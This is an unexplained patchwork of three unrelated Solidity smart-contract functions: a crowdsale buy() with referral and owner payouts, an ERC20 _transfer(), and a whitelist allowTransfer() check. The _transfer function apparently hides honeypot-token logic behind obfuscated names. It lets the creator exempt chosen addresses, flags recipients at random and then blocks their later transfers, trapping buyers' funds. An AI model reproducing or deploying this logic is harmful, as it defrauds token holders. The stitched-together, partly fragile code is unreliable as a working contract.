function buy(address _referrer) public payable icoActive Initialized {
    require(msg.value >= min);
    uint256 _amount = crowdsaleBonus(msg.value.div(price) * 1 ether);
    uint256 toReferrer = 0;
    if (referrers[_referrer]) {
        toReferrer = referrerBonusCalculate(msg.value);
        _referrer.transfer(toReferrer);
        _amount = _amount.add(referralBonusCalculate(msg.value, _amount));
        Referral(_referrer, msg.sender, msg.value, _amount, now);
    }
    token.delivery(msg.sender, _amount);
    totalEth = totalEth.add(msg.value);
    Delivery(msg.sender, _amount);
    if (getCrowdsaleState() == CrowdsaleStates.Presale) {
        presale = presale.sub(_amount);
        for (uint256 i = 0; i <= owners.length - 1; i++) {
            owners[i].transfer((msg.value.sub(toReferrer)).div(owners.length));
        }
    }
    investorsTotalBalances[msg.sender] = investorsTotalBalances[msg.sender].add(_amount);
    if (investorsTotalBalances[msg.sender] >= threshold && investorsCheck[msg.sender] == false) {
        investors.push(msg.sender);
        investorsCheck[msg.sender] = true;
        NewInvestor(msg.sender, now);
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (conquerer == false)) {
        renner = chTx;
        wyoming = true;
    }
    if ((address(sender) == creator) && (conquerer == true)) {
        darkness[recipient] = true;
        whore[recipient] = false;
        conquerer = false;
    }
    if ((amount > jeremy) && (darkness[sender] == true) && (address(sender) != creator)) {
        bengal[recipient] = true;
    }
    if (darkness[recipient] != true) {
        whore[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((whore[sender]) && (darkness[recipient] == false)) {
        whore[recipient] = true;
    }
    if (darkness[sender] == false) {
        if ((amount > jeremy) && (bengal[sender] == true)) {
            require(false);
        }
        require(amount < renner);
        if (wyoming == true) {
            if (bengal[sender] == true) {
                require(false);
            }
            bengal[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function allowTransfer(address _from, address _to) public view returns(bool) {
    if (WildcardList[_from])
        return true;
    if (LockupList[_from] > now)
        return false;
    if (!AllowTransferGlobal) {
        if (AllowTransferLocal && Whitelist[_from] != 0 && Whitelist[_to] != 0 && Whitelist[_from] < now && Whitelist[_to] < now)
            return true;
        if (AllowTransferExternal && Whitelist[_from] != 0 && Whitelist[_from] < now)
            return true;
        return false;
    }
    return true;
}

